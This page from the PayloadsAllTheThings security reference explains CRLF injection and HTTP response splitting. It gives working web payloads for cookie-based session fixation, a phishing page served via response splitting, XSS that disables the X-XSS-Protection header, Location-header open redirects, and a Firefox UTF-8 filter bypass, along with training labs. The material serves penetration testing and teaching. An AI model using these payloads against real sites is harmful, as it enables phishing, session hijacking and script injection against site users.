

[Skip to content](#carriage-return-line-feed)

Payloads All The Things

Carriage Return Line Feed

Initializing search

[GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/ "Go to repository")

Payloads All The Things

[GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/ "Go to repository")

* [Payloads All The Things](..)
* [CONTRIBUTING](../CONTRIBUTING/)
* API Key Leaks

  API Key Leaks
  + [API Key and Token Leaks](../API%20Key%20Leaks/)
  + [IIS Machine Keys](../API%20Key%20Leaks/IIS-Machine-Keys/)
* Account Takeover

  Account Takeover
  + [Account Takeover](../Account%20Takeover/)
  + [MFA Bypasses](../Account%20Takeover/mfa-bypass/)
* Business Logic Errors

  Business Logic Errors
  + [Business Logic Errors](../Business%20Logic%20Errors/)
* CORS Misconfiguration

  CORS Misconfiguration
  + [CORS Misconfiguration](../CORS%20Misconfiguration/)
* CRLF Injection

  CRLF Injection
  + Carriage Return Line Feed

    [Carriage Return Line Feed](./)

    Table of contents
    - [Summary](#summary)
    - [Methodology](#methodology)
      * [Session Fixation](#session-fixation)
      * [Cross Site Scripting](#cross-site-scripting)
      * [Open Redirect](#open-redirect)
    - [Filter Bypass](#filter-bypass)
    - [Labs](#labs)
    - [References](#references)
* CSV Injection

  CSV Injection
  + [CSV Injection](../CSV%20Injection/)
* CVE Exploits

  CVE Exploits
  + [Common Vulnerabilities and Exposures](../CVE%20Exploits/)
  + [CVE-2021-44228 Log4Shell](../CVE%20Exploits/Log4Shell/)
* Clickjacking

  Clickjacking
  + [Clickjacking](../Clickjacking/)
* Client Side Path Traversal

  Client Side Path Traversal
  + [Client Side Path Traversal](../Client%20Side%20Path%20Traversal/)
* Command Injection

  Command Injection
  + [Command Injection](../Command%20Injection/)
* Cross Site Request Forgery

  Cross Site Request Forgery
  + [Cross-Site Request Forgery](../Cross-Site%20Request%20Forgery/)
* DNS Rebinding

  DNS Rebinding
  + [DNS Rebinding](../DNS%20Rebinding/)
* DOM Clobbering

  DOM Clobbering
  + [DOM Clobbering](../DOM%20Clobbering/)
* Denial of Service

  Denial of Service
  + [Denial of Service](../Denial%20of%20Service/)
* Dependency Confusion

  Dependency Confusion
  + [Dependency Confusion](../Dependency%20Confusion/)
* Directory Traversal

  Directory Traversal
  + [Directory Traversal](../Directory%20Traversal/)
* File Inclusion

  File Inclusion
  + [File Inclusion](../File%20Inclusion/)
  + [LFI to RCE](../File%20Inclusion/LFI-to-RCE/)
  + [Inclusion Using Wrappers](../File%20Inclusion/Wrappers/)
* Google Web Toolkit

  Google Web Toolkit
  + [Google Web Toolkit](../Google%20Web%20Toolkit/)
* GraphQL Injection

  GraphQL Injection
  + [GraphQL Injection](../GraphQL%20Injection/)
* HTTP Parameter Pollution

  HTTP Parameter Pollution
  + [HTTP Parameter Pollution](../HTTP%20Parameter%20Pollution/)
* Headless Browser

  Headless Browser
  + [Headless Browser](../Headless%20Browser/)
* Hidden Parameters

  Hidden Parameters
  + [HTTP Hidden Parameters](../Hidden%20Parameters/)
* Insecure Deserialization

  Insecure Deserialization
  + [Insecure Deserialization](../Insecure%20Deserialization/)
  + [.NET Deserialization](../Insecure%20Deserialization/DotNET/)
  + [Java Deserialization](../Insecure%20Deserialization/Java/)
  + [Node Deserialization](../Insecure%20Deserialization/Node/)
  + [PHP Deserialization](../Insecure%20Deserialization/PHP/)
  + [Python Deserialization](../Insecure%20Deserialization/Python/)
  + [Ruby Deserialization](../Insecure%20Deserialization/Ruby/)
* Insecure Direct Object References

  Insecure Direct Object References
  + [Insecure Direct Object References](../Insecure%20Direct%20Object%20References/)
* Insecure Management Interface

  Insecure Management Interface
  + [Insecure Management Interface](../Insecure%20Management%20Interface/)
* Insecure Randomness

  Insecure Randomness
  + [Insecure Randomness](../Insecure%20Randomness/)
* Insecure Source Code Management

  Insecure Source Code Management
  + [Insecure Source Code Management](../Insecure%20Source%20Code%20Management/)
  + [Bazaar](../Insecure%20Source%20Code%20Management/Bazaar/)
  + [Git](../Insecure%20Source%20Code%20Management/Git/)
  + [Mercurial](../Insecure%20Source%20Code%20Management/Mercurial/)
  + [Subversion](../Insecure%20Source%20Code%20Management/Subversion/)
* JSON Web Token

  JSON Web Token
  + [JWT - JSON Web Token](../JSON%20Web%20Token/)
* Java RMI

  Java RMI
  + [Java RMI](../Java%20RMI/)
* LDAP Injection

  LDAP Injection
  + [LDAP Injection](../LDAP%20Injection/)
* LaTeX Injection

  LaTeX Injection
  + [LaTeX Injection](../LaTeX%20Injection/)
* Mass Assignment

  Mass Assignment
  + [Mass Assignment](../Mass%20Assignment/)
* Methodology and Resources

  Methodology and Resources
  + [Active Directory Attacks](../Methodology%20and%20Resources/Active%20Directory%20Attack/)
  + [Bind Shell](../Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/)
  + [Cloud - AWS](../Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/)
  + [Cloud - Azure](../Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/)
  + [Cobalt Strike](../Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/)
  + [Container - Docker](../Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/)
  + [Container - Kubernetes](../Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/)
  + [Application Escape and Breakout](../Methodology%20and%20Resources/Escape%20Breakout/)
  + [HTML Smuggling](../Methodology%20and%20Resources/HTML%20Smuggling/)
  + [Hash Cracking](../Methodology%20and%20Resources/Hash%20Cracking/)
  + [Initial Access](../Methodology%20and%20Resources/Initial%20Access/)
  + [Linux - Evasion](../Methodology%20and%20Resources/Linux%20-%20Evasion/)
  + [Linux - Persistence](../Methodology%20and%20Resources/Linux%20-%20Persistence/)
  + [Linux - Privilege Escalation](../Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/)
  + [MSSQL Server](../Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/)
  + [Metasploit](../Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/)
  + [Bug Hunting Methodology and Enumeration](../Methodology%20and%20Resources/Methodology%20and%20enumeration/)
  + [Network Discovery](../Methodology%20and%20Resources/Network%20Discovery/)
  + [Network Pivoting Techniques](../Methodology%20and%20Resources/Network%20Pivoting%20Techniques/)
  + [Office - Attacks](../Methodology%20and%20Resources/Office%20-%20Attacks/)
  + [Powershell](../Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/)
  + [Reverse Shell Cheat Sheet](../Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
  + [Source Code Management & CI/CD Compromise](../Methodology%20and%20Resources/Source%20Code%20Management/)
  + [Vulnerability Reports](../Methodology%20and%20Resources/Vulnerability%20Reports/)
  + [Subdomains Enumeration](../Methodology%20and%20Resources/Web%20Attack%20Surface/)
  + [Windows - AMSI Bypass](../Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/)
  + [Windows - DPAPI](../Methodology%20and%20Resources/Windows%20-%20DPAPI/)
  + [Windows - Defenses](../Methodology%20and%20Resources/Windows%20-%20Defenses/)
  + [Windows - Download and execute methods](../Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)
  + [Windows - Mimikatz](../Methodology%20and%20Resources/Windows%20-%20Mimikatz/)
  + [Windows - Persistence](../Methodology%20and%20Resources/Windows%20-%20Persistence/)
  + [Windows - Privilege Escalation](../Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/)
  + [Windows - Using credentials](../Methodology%20and%20Resources/Windows%20-%20Using%20credentials/)
* NoSQL Injection

  NoSQL Injection
  + [NoSQL Injection](../NoSQL%20Injection/)
* OAuth Misconfiguration

  OAuth Misconfiguration
  + [OAuth Misconfiguration](../OAuth%20Misconfiguration/)
* ORM Leak

  ORM Leak
  + [ORM Leak](../ORM%20Leak/)
* Open Redirect

  Open Redirect
  + [Open URL Redirect](../Open%20Redirect/)
* Prompt Injection

  Prompt Injection
  + [Prompt Injection](../Prompt%20Injection/)
* Prototype Pollution

  Prototype Pollution
  + [Prototype Pollution](../Prototype%20Pollution/)
* Race Condition

  Race Condition
  + [Race Condition](../Race%20Condition/)
* Regular Expression

  Regular Expression
  + [Regular Expression](../Regular%20Expression/)
* Request Smuggling

  Request Smuggling
  + [Request Smuggling](../Request%20Smuggling/)
* SAML Injection

  SAML Injection
  + [SAML Injection](../SAML%20Injection/)
* SQL Injection

  SQL Injection
  + [SQL Injection](../SQL%20Injection/)
  + [Google BigQuery SQL Injection](../SQL%20Injection/BigQuery%20Injection/)
  + [Cassandra Injection](../SQL%20Injection/Cassandra%20Injection/)
  + [DB2 Injection](../SQL%20Injection/DB2%20Injection/)
  + [MSSQL Injection](../SQL%20Injection/MSSQL%20Injection/)
  + [MySQL Injection](../SQL%20Injection/MySQL%20Injection/)
  + [Oracle SQL Injection](../SQL%20Injection/OracleSQL%20Injection/)
  + [PostgreSQL Injection](../SQL%20Injection/PostgreSQL%20Injection/)
  + [SQLite Injection](../SQL%20Injection/SQLite%20Injection/)
  + [SQLmap](../SQL%20Injection/SQLmap/)
* Server Side Include Injection

  Server Side Include Injection
  + [Server Side Include Injection](../Server%20Side%20Include%20Injection/)
* Server Side Request Forgery

  Server Side Request Forgery
  + [Server-Side Request Forgery](../Server%20Side%20Request%20Forgery/)
  + [SSRF Advanced Exploitation](../Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation/)
  + [SSRF URL for Cloud Instances](../Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances/)
* Server Side Template Injection

  Server Side Template Injection
  + [Server Side Template Injection](../Server%20Side%20Template%20Injection/)
  + [Server Side Template Injection - ASP.NET](../Server%20Side%20Template%20Injection/ASP/)
  + [Server Side Template Injection - Java](../Server%20Side%20Template%20Injection/Java/)
  + [Server Side Template Injection - JavaScript](../Server%20Side%20Template%20Injection/JavaScript/)
  + [Server Side Template Injection - PHP](../Server%20Side%20Template%20Injection/PHP/)
  + [Server Side Template Injection - Python](../Server%20Side%20Template%20Injection/Python/)
  + [Server Side Template Injection - Ruby](../Server%20Side%20Template%20Injection/Ruby/)
* Tabnabbing

  Tabnabbing
  + [Tabnabbing](../Tabnabbing/)
* Type Juggling

  Type Juggling
  + [Type Juggling](../Type%20Juggling/)
* Upload Insecure Files

  Upload Insecure Files
  + [Upload Insecure Files](../Upload%20Insecure%20Files/)
  + Configuration Apache .htaccess

    Configuration Apache .htaccess
    - [.htaccess](../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/)
* Web Cache Deception

  Web Cache Deception
  + [Web Cache Deception](../Web%20Cache%20Deception/)
* Web Sockets

  Web Sockets
  + [Web Sockets](../Web%20Sockets/)
* XPATH Injection

  XPATH Injection
  + [XPATH Injection](../XPATH%20Injection/)
* XSLT Injection

  XSLT Injection
  + [XSLT Injection](../XSLT%20Injection/)
* XSS Injection

  XSS Injection
  + [Cross Site Scripting](../XSS%20Injection/)
  + [XSS Filter Bypass](../XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/)
  + [Polyglot XSS](../XSS%20Injection/2%20-%20XSS%20Polyglot/)
  + [Common WAF Bypass](../XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass/)
  + [CSP Bypass](../XSS%20Injection/4%20-%20CSP%20Bypass/)
  + [XSS in Angular and AngularJS](../XSS%20Injection/5%20-%20XSS%20in%20Angular/)
* XXE Injection

  XXE Injection
  + [XML External Entity](../XXE%20Injection/)
* Zip Slip

  Zip Slip
  + [Zip Slip](../Zip%20Slip/)
* LEARNING AND SOCIALS

  LEARNING AND SOCIALS
  + [Books](../_LEARNING_AND_SOCIALS/BOOKS/)
  + [Twitter](../_LEARNING_AND_SOCIALS/TWITTER/)
  + [Youtube](../_LEARNING_AND_SOCIALS/YOUTUBE/)
* template vuln

  template vuln
  + [Vulnerability Title](../_template_vuln/)

Table of contents

* [Summary](#summary)
* [Methodology](#methodology)
  + [Session Fixation](#session-fixation)
  + [Cross Site Scripting](#cross-site-scripting)
  + [Open Redirect](#open-redirect)
* [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)

# Carriage Return Line Feed

> CRLF Injection is a web security vulnerability that arises when an attacker injects unexpected Carriage Return (CR) (\r) and Line Feed (LF) (\n) characters into an application. These characters are used to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.

## Summary

* [Methodology](#methodology)
  + [Session Fixation](#session-fixation)
  + [Cross Site Scripting](#cross-site-scripting)
  + [Open Redirect](#open-redirect)
* [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)

## Methodology

HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.

**CRLF Characters**:

* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.

By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:

* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
* Cache Poisoning: Forcing incorrect content to be stored in caches.
* Header Manipulation: Altering headers to mislead users or systems

### Session Fixation

A typical HTTP response header looks like this:

```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123

```

If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:

```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true

```

Now the attacker has set their own cookie.

### Cross Site Scripting

Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).

**Requested page**

```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E

```

**HTTP response**

```
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>

```

In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .

**Requested page**

```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e

```

**HTTP Response**

```
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0

```
### Open Redirect

Inject a `Location` header to force a redirect for the user.

```
%0d%0aLocation:%20http://myweb.com

```
## Filter Bypass

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.

> Newly defined header fields SHOULD limit their field values to US-ASCII octets.

Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.

| UTF-8 Character | Hex | Unicode | Stripped |
| --- | --- | --- | --- |
| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>) |
| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<) |

The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.

An example payload using UTF-8 characters would be:

```
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾

```

URL encoded version

```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE

```
## Labs

* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
* [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)

## References

* [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://www.owasp.org/index.php/CRLF_Injection)
* [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https%3A//blog.innerht.ml/twitter-crlf-injection/)
* [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1%3A192749)

November 25, 2024

**Share this content**

Back to top

Made with
[Material for MkDocs](https://squidfunk.github.io/mkdocs-material/)

